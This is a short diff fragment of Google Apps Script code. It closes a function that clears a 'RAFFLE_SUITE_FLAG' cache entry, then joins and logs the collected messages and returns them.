+  try { CacheService.getScriptCache().remove(RAFFLE_SUITE_FLAG); } catch (flagErr2) { /* non-fatal */ }
+  var msg = log.join('\n');
+  Logger.log(msg);
+  return msg;
+}
